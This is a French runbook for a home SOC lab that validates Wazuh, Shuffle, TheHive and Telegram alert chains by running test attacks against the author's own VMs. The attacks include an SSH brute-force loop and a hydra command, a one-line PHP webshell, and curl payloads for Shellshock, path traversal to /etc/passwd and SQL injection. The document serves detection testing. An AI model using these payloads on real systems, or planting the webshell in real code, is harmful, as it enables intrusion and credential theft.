# Runbook — Test end-to-end du SOC

> Note (repository): this is the manual validation runbook written during the lab, in French,
> lightly sanitized for publication. Addresses are placeholders (10.10.10.0/24 supervision
> network, 10.10.20.0/24 protected network); `$EXTERNAL_IP` stands for any reachable internet
> host. It describes the procedure that was followed; it does not contain the captured evidence.


> Objectif : valider **de bout en bout** chaque chaîne de détection→SOAR→réponse→notification,
> depuis le démarrage de la stack jusqu'à la réception de la notification **Telegram** et
> la visualisation de l'alerte dans **TheHive**.
>
> Ce document est un **runbook manuel** : on lit, on copie/colle chaque commande, on observe le
> résultat attendu. Ce n'est pas un script à exécuter d'un bloc.

---

## Topologie de référence

| Composant | Adresse / accès | Rôle |
|-----------|-----------------|------|
| Host (attaquant / hyperviseur) | `10.10.10.1` (vboxnet0) | Lance les attaques, héberge Docker |
| Wazuh Manager (conteneur) | `soc-lab-wazuh.manager-1` | Corrélation, règles, Active-Response |
| Wazuh Dashboard | `https://localhost:443` | Visualisation SIEM |
| TheHive | `http://localhost:9000` | Case management (compte analyst) |
| Shuffle (SOAR) | `http://localhost:3001` | Orchestration des playbooks |
| VM **OPNsense-FW** | `10.10.10.x` (vboxnet0) / `10.10.20.1` (lan-protected) | Pare-feu de périmètre, passerelle du réseau protégé |
| VM **Victim-VM** | `10.10.20.101` — SSH port **2022** | Victime Ubuntu — agent **006** |
| VM **Suricata-Sensor** | `10.10.20.x` — SSH port 2022 | Capteur réseau IDS — agent **007** |
| VM **DC-LAB** | `10.10.20.x` (Windows) | Contrôleur de domaine — agent **005** |

> ⚠️ **Depuis la re-segmentation OPNsense, toute la flotte (DC, victime, capteur) est sur le
> réseau protégé `10.10.20.0/24`**, plus sur le réseau plat `10.10.10.0/24`. Les trois VMs
> sont attachées au réseau interne VirtualBox `lan-protected` ; seul l'hôte de supervision et
> l'interface WAN d'OPNsense restent sur `10.10.10.0/24`.
>
> **Avant de commencer, confirmer les adresses réelles** (elles ne sont pas figées dans ce
> document pour éviter de propager une valeur périmée) :
> ```bash
> # depuis le manager Wazuh : liste des agents et de leur IP courante
> docker exec soc-lab-wazuh.manager-1 /var/ossec/bin/agent_control -l
> ```
> Puis exporter les variables utilisées par la suite du runbook :
> ```bash
> export VICTIM=10.10.20.101      # Victim-VM  — agent 006
> export SENSOR=10.10.20.<X>      # Suricata-Sensor — agent 007  (à confirmer)
> export DC=10.10.20.<Y>          # DC-LAB — agent 005 (à confirmer)
> ```

**Webhooks Shuffle** (déclarés dans l'`ossec.conf` du manager) :
- Playbook 1 — menaces **IP** (`authentication_failures,ids`) → `.../hooks/webhook_5b278dc0-...`
- Playbook 2 — **malware** (`yara,malware`) → `.../hooks/webhook_44a25aa0-...`
- Playbook 3 — **connexion hors horaires** (`off_hours`) → `.../hooks/webhook_bc15d977-...`

Les groupes `soc_alert` et `usb` ne passent **pas** par Shuffle : ils sont routés directement vers
Telegram par une intégration `custom-telegram` du manager.

Seules les alertes **niveau ≥ 10** partent vers Shuffle (filtre `<level>10</level>` sur les intégrations).

---

## PARTIE 0 — Démarrage & pré-vol

### 0.1 — Démarrer la stack Docker (si pas déjà UP)

Ordre imposé : **Wazuh** → **TheHive/Cortex** → **Shuffle** (Shuffle en dernier car il active
Docker Swarm, ce qui casse le réseau bridge — voir 0.3).

```bash
# 1) Wazuh (indexer + manager + dashboard)
cd $HOME/detection-lab/lab/wazuh-docker/single-node
docker compose up -d

# 2) TheHive + Cassandra + Cortex
cd $HOME/detection-lab/lab/response-layer/thehive-cortex
docker compose up -d

# 3) Shuffle (frontend + backend + orborus + opensearch)
cd $HOME/detection-lab/lab/response-layer/shuffle/Shuffle
docker compose up -d
```

Vérifier que tout tourne :

```bash
docker ps --format '{{.Names}}\t{{.Status}}'
```

Attendus (au minimum) : `soc-lab-wazuh.manager-1`, `...indexer-1`, `...dashboard-1`,
`soc-thehive`, `soc-cassandra`, `shuffle-frontend`, `shuffle-backend`, `shuffle-orborus`.

### 0.2 — Bridge réseau (désormais AUTOMATIQUE via systemd)

Shuffle/Swarm remet `bridge-nf-call-iptables` à `1`, ce qui fait perdre au manager l'accès à
l'indexer (filebeat `dial timeout`, dashboard 503). **Depuis le 2026-07-06 c'est corrigé
automatiquement** par un timer systemd (`wazuh-bridge-nf.timer`) qui réapplique `=0` au boot et
toutes les 20 s. Il n'y a donc plus rien à faire manuellement — juste vérifier au besoin :

```bash
sysctl -n net.bridge.bridge-nf-call-iptables    # doit afficher 0
systemctl status wazuh-bridge-nf.timer          # doit être active/enabled
```

> Fix de secours (si le timer était désactivé) : `sudo sysctl -w net.bridge.bridge-nf-call-iptables=0`

### 0.3 — Démarrer les VMs (victimes + capteur)

```bash
VBoxManage startvm Victim-VM        --type headless   # victime (agent 006) — REQUISE
VBoxManage startvm Suricata-Sensor   --type headless   # capteur IDS (agent 007) — pour Partie 3
VBoxManage startvm DC-LAB --type headless  # DC Windows (agent 005) — pour Partie 4 (lourd RAM)
```

> RAM limitée (15 Go) : si besoin, ne démarrer que les VMs du scénario testé.
> HoneyPot seule suffit pour les Parties 1 et 2.

### 0.4 — Pré-vol : vérifier que les agents sont **Active**

```bash
docker exec soc-lab-wazuh.manager-1 /var/ossec/bin/agent_control -l
```

Attendu (après ~30–60 s de boot des VMs) :

```
ID: 005, Name: DC-LAB, ... Active
ID: 006, Name: victim-01,  ... Active
ID: 007, Name: suricata-sensor,     ... Active
```

Si un agent reste `Disconnected` : attendre, ou re-vérifier le bridge (0.2), ou redémarrer
l'agent dans la VM (`sudo systemctl restart wazuh-agent`).

### 0.5 — Ouvrir les 3 consoles de supervision

- **Dashboard Wazuh** : `https://localhost:443`
- **TheHive** : `http://localhost:9000` (se connecter avec le compte analyst)
- **Shuffle** : `http://localhost:3001` (onglet *Workflows* → runs en direct)
- **Telegram** : garder le chat du bot ouvert sur le téléphone

### 0.6 — Terminal « observateur » (à laisser tourner pendant les tests)

Dans un terminal dédié, suivre le flux d'alertes du manager en temps réel :

```bash
docker exec soc-lab-wazuh.manager-1 \
  tail -f /var/ossec/logs/alerts/alerts.json | \
  grep --line-buffered -E '"id":"(5712|5763|100210|100500|100501|86601)"'
```

Et le journal des réponses actives (block IP / isolation) :

```bash
docker exec soc-lab-wazuh.manager-1 tail -f /var/ossec/logs/active-responses.log
```

---

## PARTIE 1 — Scénario A : Brute-force SSH → blocage d'IP (Playbook 1)

**Chaîne testée :** échecs SSH répétés → règle **5712** (niv 10) → `firewall-drop` (bannit l'IP)
+ intégration Shuffle (groupe `authentication_failures`) → Playbook 1 → VirusTotal → TheHive + Telegram.

### 1.1 — Lancer l'attaque (depuis le host)

Générer une rafale d'échecs d'authentification contre la victime :

```bash
for i in $(seq 1 12); do
  ssh -p 2022 -o StrictHostKeyChecking=no \
      -o PreferredAuthentications=password \
      -o PubkeyAuthentication=no \
      -o ConnectTimeout=3 \
      attacker@"$VICTIM" 2>/dev/null
done
```

> (Chaque tentative demande un mot de passe : appuyer sur Entrée / laisser échouer.
> Alternative si `hydra` est installé :
> `hydra -l attacker -P /usr/share/wordlists/rockyou.txt -t 4 ssh://"$VICTIM":2022 -f`)

### 1.2 — Résultats attendus, couche par couche

| Couche | Vérification | Attendu |
|--------|-------------|---------|
| Détection | terminal 0.6 (alerts.json) | apparition rule `5710` (échec) puis **`5712`** (brute force, level 10) |
| Réponse (block) | `active-responses.log` | ligne `firewall-drop ... add ... 10.10.10.1` |
| Réponse (agent) | sur la VM : `sudo iptables -L -n | grep 10.10.10.1` | règle DROP présente (600 s) |
| SOAR | Shuffle → Workflows → *SOC Playbook Ultimate* | un **run** apparaît (Webhook `5b278dc0`) |
| Case | TheHive → Alerts/Cases | alerte **« [SSH BRUTE-FORCE] … »** créée |
| Notif | Telegram | message reçu (sévérité selon verdict VirusTotal) |

### 1.3 — Vérifs manuelles complémentaires

```bash
# Confirmer le blocage côté victime (depuis le host) :
ssh -p 2022 labuser@"$VICTIM" 'sudo iptables -L INPUT -n | grep DROP'
```

### 1.4 — Nettoyage

Le `firewall-drop` expire seul après **600 s** (timeout). Pour lever immédiatement :

```bash
ssh -p 2022 labuser@"$VICTIM" 'sudo iptables -F'   # (lab uniquement)
```

---

## PARTIE 2 — Scénario B : Malware (YARA) → auto-isolation de l'hôte + Playbook 2

**Chaîne testée :** dépôt de fichier dans un dossier surveillé (FIM realtime) → `yara.sh` scanne avec
le ruleset **signature-base** → match → règle **100210** (niv 12, groupe `syscheck,yara`) →
Active-Response **`isolate-host`** (coupe le réseau de la victime, garde le manager) + intégration
Shuffle (groupe `yara,malware`) → Playbook 2 → TheHive + Telegram.

### 2.1a — Test EICAR (fichier de test antivirus standard, inoffensif)

Se connecter à la victime et déposer le fichier EICAR dans le dossier surveillé
`/home/labuser/malware-test/` :

```bash
ssh -p 2022 -i ~/.ssh/id_ed25519 labuser@"$VICTIM"

# --- sur la victime : ---
printf 'X5O!P%%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' \
  > /home/labuser/malware-test/eicar_test.txt
```

### 2.1b — Test « vrai » webshell (détection par règle signature-base réelle)

Toujours sur la victime, déposer un webshell PHP dynamique (déclenche la règle réelle
`WEBSHELL_PHP_Dynamic_Big` du ruleset Neo23x0, **pas** une règle custom) :

```bash
# --- sur la victime : ---
cat > /home/labuser/malware-test/shell.php <<'EOF'
<?php $a = $_GET['x']; $b = "sys"."tem"; $b($a); ?>
EOF
```

### 2.2 — Résultats attendus

| Couche | Vérification | Attendu |
|--------|-------------|---------|
| Scan déclenché | alerts.json | rule **`100200`** (scan lancé, niv 7) |
| Détection | alerts.json | rule **`100210`** (**Malware détecté**, niv 12, MITRE T1204) |
| Isolation | `active-responses.log` | ligne `isolate-host ... add` puis `HOTE ISOLE` |
| Isolation (effet) | depuis la victime : `ping -c2 "$EXTERNAL_IP"` | **échec** (internet coupé) |
| Isolation (préservée) | depuis la victime : `ping -c2 10.10.10.1` | **OK** (manager toujours joignable) |
| SOAR | Shuffle → *SOC Playbook 2 - Malware Response* | run via Webhook `44a25aa0` |
| Case | TheHive | case **« [MALWARE] victim-01 - … »** sévérité **High**, observables `filename`+`hostname`, tag `host-isolated` |
| Notif | Telegram | message « malware détecté + hôte isolé » |

Vérifier le résultat du scan YARA côté victime :

```bash
# --- sur la victime : ---
grep 'wazuh-yara' /var/ossec/logs/active-responses.log | tail -5
# attendu : "Scan result: WEBSHELL_PHP_Dynamic_Big /home/labuser/malware-test/shell.php"
#           "Scan result: SUSP_Just_EICAR /home/labuser/malware-test/eicar_test.txt"
```

### 2.3 — Dé-isolation (fin de test)

L'isolation expire seule après **1800 s** (30 min). Pour rétablir immédiatement, déclencher la
commande `delete` de l'AR, ou vider les chaînes sur la victime :

```bash
# --- sur la victime : ---
sudo iptables -F WAZUH_ISOLATE_OUT 2>/dev/null
sudo iptables -F WAZUH_ISOLATE_IN  2>/dev/null
ping -c2 "$EXTERNAL_IP"   # doit re-fonctionner
```

Puis nettoyer les fichiers de test :

```bash
# --- sur la victime : ---
rm -f /home/labuser/malware-test/eicar_test.txt /home/labuser/malware-test/shell.php
```

### 2.4 — Vérifier le **routage** (point clé du design)

Le malware **ne doit PAS** partir vers le Playbook 1 (IP). Confirmer que l'intégration IP n'a pas
été sollicitée par l'événement malware :

```bash
docker exec soc-lab-wazuh.manager-1 tail -20 /var/ossec/logs/integrations.log
# attendu : trafic vers webhook 44a25aa0 (malware) uniquement, pas 5b278dc0
```

---

## PARTIE 3 — Scénario C : Attaques réseau détectées par Suricata

**Chaîne testée :** attaque réseau depuis le host → **Suricata** (VM capteur, sniff promiscuous
sur vboxnet0) → `eve.json` → agent **007** → manager → règle base **86601** escaladée par
**catégorie** en **100500** (niv 10) / **100501** (niv 12) → intégration Shuffle (groupe `ids`) →
Playbook 1 → TheHive + Telegram.

> Prérequis : VM `Suricata-Sensor` démarrée (0.3) et agent 007 `Active` (0.4).

### 3.1 — Préparer une cible d'écoute sur le capteur

Les règles ET Open `$EXTERNAL_NET -> $HOME_NET` ont besoin d'un flux TCP établi. Lancer un
serveur HTTP jetable sur le capteur :

```bash
ssh -p 2022 -i ~/.ssh/id_ed25519 labuser@"$SENSOR" \
  'cd /tmp && nohup python3 -m http.server 80 >/dev/null 2>&1 &'
```

### 3.2 — Lancer les attaques réelles (depuis le host, cible = `$SENSOR`)

```bash
# (a) Shellshock / CVE-2014-6271  → catégorie CRITIQUE → escalade 100501 (niv 12)
curl -s -A "() { :;}; /bin/bash -c 'id'" http://"$SENSOR"/ -o /dev/null

# (b) Scan sqlmap  → Web Application Attack → escalade 100500 (niv 10)
curl -s -A "sqlmap/1.7-dev" "http://"$SENSOR"/?id=1" -o /dev/null

# (c) LFI /etc/passwd  → escalade 100500 (niv 10)
curl -s "http://"$SENSOR"/?file=../../../../etc/passwd" -o /dev/null

# (d) Injection SQL dans l'URL
curl -s "http://"$SENSOR"/?id=1%27%20OR%20%271%27=%271" -o /dev/null

# (e) Scan de ports / version (Nmap NSE)
nmap -sV -T4 "$SENSOR"
```

### 3.3 — Résultats attendus

| Couche | Vérification | Attendu |
|--------|-------------|---------|
| Capteur | sur le capteur : `sudo tail -f /var/log/suricata/eve.json` | events `event_type: alert` (ET WEB_SERVER / ET SCAN…) |
| Détection | alerts.json (terminal 0.6) | rule **86601** puis escalade **100500** (niv 10) / **100501** (niv 12 pour Shellshock) |
| Bruit filtré | alerts.json | `Misc activity` / `ET INFO` restent **niv 3** (pas d'escalade → pas de notif) |
| SOAR | Shuffle → *SOC Playbook Ultimate* | run(s) via Webhook `5b278dc0` |
| Case | TheHive | alerte réseau créée |
| Notif | Telegram | message pour Shellshock / sqlmap / LFI |

### 3.4 — Nettoyage

```bash
# arrêter le serveur HTTP jetable sur le capteur :
ssh -p 2022 -i ~/.ssh/id_ed25519 labuser@"$SENSOR" 'pkill -f "http.server 80"'
```

---

## PARTIE 4 — Scénario D : Détection Windows AD / Sysmon (DC)

**Chaîne testée :** activité suspecte sur le DC → **Sysmon** → agent **005** → règles Wazuh
Sysmon/Windows → dashboard (+ escalade/notif si niv ≥ 10).

> Prérequis : VM `DC-LAB` démarrée, agent 005 `Active`.
> (Couverture YARA + isolate-host **pas encore déployée** sur le DC — cf. « Reste à faire ».)

### 4.1 — Générer un événement observable

Sur le DC (session RDP/console), exécuter par ex. une énumération ou une commande sensible :

```powershell
# --- sur le DC (PowerShell) ---
whoami /priv
net user /domain
# ou un téléchargement suspect (déclenche Sysmon EventID 1 / 3) :
powershell -c "Invoke-WebRequest -Uri http://10.10.10.1/test -OutFile C:\Windows\Temp\t.txt"
```

### 4.2 — Résultats attendus

| Couche | Vérification | Attendu |
|--------|-------------|---------|
| Télémétrie | Dashboard → agent 005 | events Sysmon (ProcessCreate / NetworkConnect) indexés |
| Détection | alerts.json | règles Windows/Sysmon correspondantes |

---

## PARTIE 5 — Vérification centralisée & bilan

### 5.1 — Vue SIEM (Dashboard Wazuh)

`https://localhost:443` → *Threat Hunting* / *Security events* → filtrer par `rule.level >= 10`
sur la fenêtre de test. On doit retrouver : 5712, 100210, 100500/100501, (Windows).

### 5.2 — Vue Case Management (TheHive)

`http://localhost:9000` (compte analyst) → chaque scénario a produit une **alerte/case** avec
titre clair, description, observables (IP, filename, hostname) et tags.

### 5.3 — Vue SOAR (Shuffle)

`http://localhost:3001` → *Workflows* → l'historique des **runs** montre les 2 playbooks
déclenchés, le résultat des nœuds (VirusTotal, condition, TheHive, Telegram).

### 5.4 — Notifications (Telegram)

Le chat du bot contient un message par alerte critique (brute-force, malware, réseau).

---

## Annexe — Pièges connus (dépannage)

| Symptôme | Cause | Correctif |
|----------|-------|-----------|
| Dashboard 503 / filebeat `dial timeout` | `bridge-nf-call-iptables` repassé à 1 (Swarm) | `sudo sysctl -w net.bridge.bridge-nf-call-iptables=0` |
| Manager ne démarre plus après édition (`Error reading XML line 0`) | `docker cp` a mis le fichier en uid 1000 | `docker exec ... chown wazuh:wazuh <fichier> && chmod 0660 ossec.conf` |
| Agent `Disconnected` malgré VM up | flapping / bridge / boot | attendre, `sudo systemctl restart wazuh-agent` sur la VM |
| AR API « not sent to any agent » | manque le préfixe `!` | utiliser `!firewall-drop` / `!isolate-host` |
| Telegram HTTP 400 | `parse_mode:Markdown` + chemin avec `_` | envoyer en texte brut (sans parse_mode) |
| Notification en double / flood | 1 scan = N alertes (throttling non implémenté) | *À FAIRE* — agrégation |

---

## Ordre d'extinction propre (fin de session)

```bash
# 1) sauvegarder l'état des VMs (rapide, garde la RAM/état)
VBoxManage controlvm Victim-VM        savestate
VBoxManage controlvm Suricata-Sensor   savestate
VBoxManage controlvm DC-LAB savestate

# 2) arrêter les conteneurs (dans l'ordre inverse : Shuffle → TheHive → Wazuh)
cd $HOME/detection-lab/lab/response-layer/shuffle/Shuffle && docker compose stop
cd $HOME/detection-lab/lab/response-layer/thehive-cortex && docker compose stop
cd $HOME/detection-lab/lab/wazuh-docker/single-node && docker compose stop
```

> Note : les workers Swarm de Shuffle survivent à `docker compose stop`. Pour libérer la RAM
> complètement : `docker service rm $(docker service ls -q)` puis `docker swarm leave --force`.
